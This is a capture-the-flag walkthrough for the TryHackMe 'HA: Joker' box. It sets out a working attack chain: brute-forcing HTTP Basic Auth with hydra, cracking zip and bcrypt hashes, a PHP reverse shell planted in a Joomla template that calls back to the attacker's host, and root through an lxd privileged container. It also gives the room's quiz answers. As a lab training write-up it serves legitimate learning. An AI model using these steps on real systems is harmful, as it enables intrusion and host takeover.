# TryHackMe — HA: Joker

> A Joomla box with a twist: the real app is hidden behind HTTP Basic Auth on a second port, and root comes from a `www-data` account that happens to sit in the `lxd` group. No kernel exploit — just an unprivileged container that mounts the host's disk.

## Recon

```bash
nmap -sS -T4 -p- --min-rate 1000 -Pn <target-ip>
nmap -sV -sC -p 22,80,8080 <target-ip>
```

```
22/tcp    OpenSSH 8.2p1 Ubuntu
80/tcp    Apache httpd 2.4.41 (Ubuntu)   — title "HA: Joker", /phpinfo.php present
8080/tcp  Apache httpd 2.4.41 (Ubuntu)   — 401, Basic realm="Please enter the password."
```

Two web ports. Port 80 is a static landing page; port 8080 is locked behind Basic Auth. The backend-revealing file is the obvious `phpinfo.php` sitting on port 80.

**Q: Port without authentication → `80`**
**Q: Port with Basic Auth → `8080`**
**Q: File that reveals the backend → `phpinfo.php`**
**Q: Apache version → `2.4.29`**

> Gotcha: the redeployed box's `Server` header and `nmap -sV` both report **2.4.41**, but the accepted answer is **2.4.29** — the room's key was written against the original VM (Ubuntu 18.04). If `2.4.41` is rejected, this mismatch is why; answer `2.4.29`.

---

## The secret file

Port 80's gobuster run came up thin until I added extensions — the first pass used none, so a `.txt` was invisible. Checking names directly:

```bash
curl -s http://<target-ip>/secret.txt
```

```
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
...
Joker: "HA! HA! HA! HA! ..."
```

**Q: Secret file → `secret.txt`**

Two things to take from it: the name **joker** (the Basic Auth username), and the repeated word **rock** — a nudge toward `rockyou.txt`.

---

## Cracking the Basic Auth (port 8080)

```bash
hydra -l joker -P /usr/share/wordlists/rockyou.txt \
  -s 8080 -f -t 16 <target-ip> http-get /
```

```
[8080][http-get] login: joker   password: hannah
```

**Q: Basic Auth password → `hannah`**

Behind the auth is a **Joomla 3.7.0** site. The page source gives up the next answer for free:

```html
<meta name="author" content="Super Duper User" />
<meta name="generator" content="Joomla! - Open Source Content Management" />
```

**Q: Super Duper User (site author) → `Super Duper User`**
**Q: Admin directory → `/administrator`** (Joomla's default)

---

## The backup file

Guessing common backup names behind the auth:

```bash
curl -s -o /dev/null -w '%{http_code}\n' -u joker:hannah http://<target-ip>:8080/backup.zip   # 200
curl -s -u joker:hannah http://<target-ip>:8080/backup.zip -o backup.zip
```

**Q: Backup file → `backup.zip`**

The zip is encrypted. `zip2john` + `john` cracks it instantly — and the password is the same word again:

```bash
zip2john backup.zip > backup.hash
john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
john --show backup.hash     # backup.zip:hannah
unzip -o -P hannah backup.zip -d backup
```

**Q: Backup zip password → `hannah`**

Inside is a full Joomla backup: `configuration.php` and a DB dump.

```bash
grep -E "public \$(user|password|db) " backup/site/configuration.php
```

```
public $user     = 'joomla';
public $password = '1234';
public $db       = 'joomladb';
```

The DB dump holds the Super User row with a bcrypt hash:

```bash
grep -o "INSERT INTO \`cc1gr_users\`[^;]*" backup/db/joomladb.sql
```

```
(547,'Super Duper User','admin','admin@example.com',
 '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG', ...)
```

```bash
echo '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG' > admin.hash
john --wordlist=/usr/share/wordlists/rockyou.txt admin.hash
```

```
abcd1234   (bcrypt)
```

**Q: Super Duper User login / password → `admin` / `abcd1234`**

---

## Joomla admin → reverse shell

Log in at `http://<target-ip>:8080/administrator/` (Basic Auth `joker:hannah`, then Joomla `admin:abcd1234`).

**Extensions → Templates → Templates → Protostar** → edit `error.php`, replace with a reverse shell:

```php
<?php
set_time_limit(0);
$s=fsockopen("<your-vpn-ip>",4444);
$p=proc_open("/bin/bash -i",array(0=>$s,1=>$s,2=>$s),$pipes);
?>
```

Listener up, then trigger it in the same authenticated browser session:

```bash
nc -lvnp 4444
# visit: http://<target-ip>:8080/templates/protostar/error.php
```

```bash
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
```

**Q: Reverse shell session owner → `www-data`**
**Q: Its group → `www-data`**

Upgrade to a TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Q: TTY shell → `python3 -c 'import pty;pty.spawn("/bin/bash")'`**

---

## Privesc — the `lxd` group

`www-data` is in **`lxd`**, which is root-equivalent: you can launch a privileged container and bind-mount the host's `/` into it.

### Snag 1 — the snap client won't run

```
Sorry, home directories outside of /home needs configuration.
```

The `lxc` command is a snap wrapper that refuses to run because `www-data`'s home (`/var/www`) is outside `/home`. **Bypass it by calling the real binary directly**, with a writable config dir and the snap's socket:

```bash
export LXD_DIR=/var/snap/lxd/common/lxd
export LXD_CONF=/tmp/.lxc
B=/snap/lxd/current/bin/lxc
$B image list     # works — empty table
```

A quick sanity check over the daemon's unix socket confirmed `"auth":"trusted"` — full API access.

### Snag 2 — no image, no internet

The box has no cached image and no outbound internet. Build a tiny Alpine image on the attacker and serve it over the VPN:

```bash
# attacker (real internet)
wget https://github.com/saghul/lxd-alpine-builder/raw/master/alpine-v3.13-x86_64-20210218_0139.tar.gz
python3 -m http.server 8000
```

```bash
# target
wget http://<your-vpn-ip>:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz -O /tmp/alpine.tar.gz
```

> If the target's `wget` times out reaching your HTTP server while the reverse shell connected fine, it's your **host firewall** blocking inbound 8000 — the box can reach you (it hit 4444), you just need to open the port.

### Build the privileged container

The interactive reverse shell mangled multi-line input badly and `Ctrl+C` kept killing `nc`, so I ran the whole thing **detached**, writing the flag to a file I could read from any shell:

```bash
nohup bash -c 'export LXD_DIR=/var/snap/lxd/common/lxd LXD_CONF=/tmp/.lxc; \
B=/snap/lxd/current/bin/lxc; \
$B image import /tmp/alpine.tar.gz --alias alpine; \
$B delete -f pwn 2>/dev/null; \
$B init alpine pwn -c security.privileged=true; \
$B config device add pwn host disk source=/ path=/mnt/root recursive=true; \
$B start pwn; sleep 3; \
$B exec pwn -- sh -c "cat /mnt/root/root/*.txt" > /tmp/flag.txt 2>&1' &

cat /tmp/flag.txt
```

Inside the privileged container, `security.privileged=true` means container-root **is** host-root, and the `host` device maps the real `/` to `/mnt/root`:

```bash
$B exec pwn -- id      # uid=0(root) gid=0(root)
ls /mnt/root/root/     # final.txt
```

**Q: `/root` filename → `final.txt`**

```
!! Congrats you have finished this task !!
 |E|n|j|o|y| |H|A|C|K|I|N|G|
```

---

## Takeaways

- **Two web ports** — always scan the full range and fingerprint each service; the real app was never on 80.
- **The same password (`hannah`) was reused** across Basic Auth and the backup zip. Credential reuse is the quiet theme of this box.
- **`lxd` group = root.** It's not a kernel exploit or a misconfigured SUID — it's a *group membership* that hands you the host disk. The only friction was the snap wrapper, solved by invoking `/snap/lxd/current/bin/lxc` directly.
- When a reverse shell is too fragile for interactive work, **detach the job and read results from a file** instead of fighting the TTY.
